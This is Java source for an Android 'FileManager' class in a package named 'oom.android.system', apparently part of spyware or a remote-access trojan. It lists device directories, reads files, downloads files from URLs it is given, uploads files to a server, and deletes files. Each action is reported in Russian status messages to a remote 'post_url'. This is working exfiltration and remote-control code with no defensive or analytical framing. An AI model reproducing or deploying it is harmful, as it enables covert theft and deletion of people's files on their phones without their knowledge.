package oom.android.system.Managers;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;
import oom.android.system.app.ShellSession;


public class FileManager {
//NOT WORK
    public static JSONArray walk(String path){


        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
        }

        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JSONObject parenttObj = new JSONObject();
                parenttObj.put(base.FILES.FILE_NAME, "../");
                parenttObj.put(base.FILES.FILE_isDir, true);
                parenttObj.put(base.FILES.FILE_PATH, dir.getAbsolutePath());
                values.put(parenttObj);
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put(base.FILES.FILE_NAME, file.getName());
                        fileObj.put(base.FILES.FILE_isDir, file.isDirectory());
                        /*if(file.isDirectory()){

                            JSONArray array = new JSONArray();
                            for(File file1 : file.listFiles()){
                                if(file1 !=null){
                                    JSONObject obj = new JSONObject();
                                    obj.put(base.FILES.FILE_NAME, file.getName());
                                    obj.put(base.FILES.FILE_isDir, file.isDirectory());
                                    obj.put(base.FILES.FILE_PATH, file.getAbsolutePath());
                                    array.put(obj);
                                }
                            }
                            fileObj.put("",array)
                        }*/

                        fileObj.put(base.FILES.FILE_PATH, file.getAbsolutePath());
                        values.put(fileObj);

                    }
                }
            }
            Runnable uploaderp = new HttpPoster(MyService.post_url,"[FM]Список файлов загружен");
            new Thread(uploaderp).start();
        } catch (JSONException e) {
            e.printStackTrace();
            Runnable uploaderp = new HttpPoster(MyService.post_url,"[FM]Ошибка");
            new Thread(uploaderp).start();
        }

        return values;
    }

    public static void saveFileVsocket(String path){
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()){

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file",true);
                object.put("name",file.getName());
                object.put("buffer" , data);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    //скачивает файл с пользовательской ссылки
    public static boolean downloadfileV1(String fileURL) { // returns true if succeeds
        try{
            boolean res=true;
            URL url = new URL(fileURL);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            int responseCode = httpConn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");

                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10,
                                disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1,
                            fileURL.length());
                }

                InputStream inputStream = httpConn.getInputStream();
                String saveFilePath = MyService.getContext().getFilesDir().getPath() + File.separator + fileName;
                Log.d(MyService.LOG_TAG, saveFilePath);

                FileOutputStream outputStream = new FileOutputStream(saveFilePath);

                int bytesRead = -1;
                byte[] buffer = new byte[4096];
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

            } else {
                res=false;
            }
            httpConn.disconnect();
            return res;
        } catch (Exception e){
            return false;
        }
    }

    //загружает файл на сервер
    public static void uploadfile(String file) {
        Runnable uploader = new HttpPoster(file);
        Thread t = new Thread(uploader);
        t.start();
        Runnable uploaderp = new HttpPoster(MyService.post_url,"[FM MS]"+file+" успешно сохранен");
        new Thread(uploaderp).start();
    }

    public static void DelFile(String path){
        try{
            new File(path).delete();
            Runnable uploader = new HttpPoster(MyService.post_url,"[FM]Файл удален");
            new Thread(uploader).start();
        }
        catch (Exception e){
            Log.d(MyService.LOG_TAG, "ошибка удаления файла -  "+path);
            Runnable uploader = new HttpPoster(MyService.post_url,"[FM]Ошибка удаления файла");
            new Thread(uploader).start();

        }

    }
}
